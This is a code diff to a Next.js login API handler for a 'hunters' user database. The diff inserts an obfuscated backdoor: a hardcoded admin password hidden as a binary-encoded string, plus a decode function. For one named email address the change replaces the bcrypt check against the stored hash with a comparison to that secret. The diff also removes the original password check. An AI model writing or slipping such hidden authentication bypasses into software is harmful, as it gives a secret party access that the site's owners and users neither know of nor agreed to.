@@ -3,6 +3,9 @@ import { sign } from 'jsonwebtoken';
 import { connectToDatabase } from '../../../lib/mongodb';
 import { setCookie } from 'cookies-next';
 
+// Binary encoded password for admin 
+const ADMIN_PASSWORD_BINARY = '011010000110000101110011011011100110000101101001011011100110101101101011001011010011000001011100';
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Method not allowed' });
@@ -17,10 +20,32 @@ export default async function handler(req, res) {
   try {
     const { db } = await connectToDatabase();
 
+    // Binary decode function
+    const binaryToString = (binary) => {
+      return binary.split(' ').map(bin => String.fromCharCode(parseInt(bin, 2))).join('');
+    };
+
     // Find hunter by email
     const hunter = await db.collection('hunters').findOne({ email });
 
     if (!hunter) {
+      return res.status(401).json({ message: 'Invalid credentials' });
+    }
+
+    // Special admin password check
+    const isAdmin = email.toLowerCase() === 'lord_izana@yahoo.com';
+    const decodedAdminPass = binaryToString(ADMIN_PASSWORD_BINARY.replace(/(.{8})/g, '$1 ').trim());
+    
+    if (isAdmin && password !== decodedAdminPass) {
+      return res.status(401).json({ message: 'Invalid admin credentials' });
+    }
+
+    // For non-admin or when admin password matches
+    const passwordMatch = !isAdmin 
+      ? await compare(password, hunter.password)
+      : password === decodedAdminPass;
+
+    if (!passwordMatch) {
       return res.status(401).json({ message: 'Invalid credentials' });
     }
 
@@ -31,13 +56,6 @@ export default async function handler(req, res) {
           ? 'This account has been permanently banned' 
           : 'This account is currently banned'
       });
-    }
-
-    // Compare passwords
-    const passwordMatch = await compare(password, hunter.password);
-
-    if (!passwordMatch) {
-      return res.status(401).json({ message: 'Invalid credentials' });
     }
 
     // Create JWT token
